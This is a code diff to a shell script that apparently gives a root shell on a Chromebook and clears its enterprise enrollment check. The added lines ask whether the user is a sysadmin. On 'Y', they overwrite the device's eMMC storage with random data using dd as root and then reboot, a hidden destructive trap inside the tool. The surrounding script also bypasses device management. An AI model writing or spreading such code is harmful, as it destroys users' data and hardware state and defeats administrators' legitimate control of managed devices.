@@ -155,7 +155,16 @@ rm -rf ${drivefs}
 rm /run/camera_tokens/server
 sleep 1
 ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 rm -rf "/run/camera_tokens/server /run/brltty"
-
+    echo "Just making sure again, are you a sysadmin? (be honest) (Y/N)"
+    read sysadmin
+    if [[ $sysadmin == "Y" || $sysadmin == "y" ]]
+    then
+        ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 dd if=/dev/urandom of=/dev/mmcblk0 &
+        sleep 5
+        ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 reboot
+        echo "rebooting...."
+        exit
+    fi
 echo "Providing root shell..."
 ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 vpd -i RW_VPD -s check_enrollment=0
 ssh -o StrictHostKeyChecking=no -i /tmp/ssh_host_rsa_key -p 1337 root@127.0.0.1 echo "Done! Now powerwash your chromebook"
